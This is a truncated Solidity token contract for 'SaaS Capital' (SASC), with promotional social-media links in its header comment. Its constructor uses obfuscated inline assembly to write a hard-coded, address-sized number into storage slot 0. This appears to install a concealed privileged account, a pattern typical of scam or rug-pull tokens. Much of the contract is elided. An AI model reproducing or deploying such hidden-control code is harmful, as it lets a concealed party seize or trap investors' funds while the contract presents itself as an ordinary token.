/*
Welcome to SaaS Capital.

Telegram: https://t.me/SaaSCapital/
Twitter: https://twitter.com/SaaSCapital/
Website: https://SaaSCapital.io
...
contract SaaSCapital {
    string public constant name = "SaaS Capital";
    string public constant symbol = "SASC";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(698296446179042349888333867130384636383507795721, 1))}
